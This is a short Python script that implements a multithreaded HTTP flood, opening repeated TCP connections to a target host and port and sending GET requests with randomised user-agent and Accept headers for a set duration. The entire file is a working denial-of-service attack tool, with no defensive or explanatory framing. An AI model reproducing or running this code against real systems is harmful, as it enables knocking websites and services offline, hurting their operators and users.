import threading
import socket
import random
import time

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

accept_all = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xml;q=0.9,*/*;q=0.8",
    "application/json;q=0.9,*/*;q=0.8",
]

def generate_headers(host):
    headers = f"GET / HTTP/1.1\r\n"
    headers += f"Host: {host}\r\n"
    headers += f"User-Agent: {random.choice(user_agents)}\r\n"
    headers += f"Accept: {random.choice(accept_all)}\r\n"
    headers += "Connection: Keep-Alive\r\n\r\n"
    return headers.encode()

def flood_http(host, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            s.send(generate_headers(host))
            s.close()
        except:
            pass

def start_http_flood(ip, port, duration, threads=50):
    print(f"\n[✓] Starting HTTP Flood on {ip}:{port} for {duration}s with {threads} threads...\n")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood_http, args=(ip, port, duration))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("[✓] HTTP Flood completed.\n")
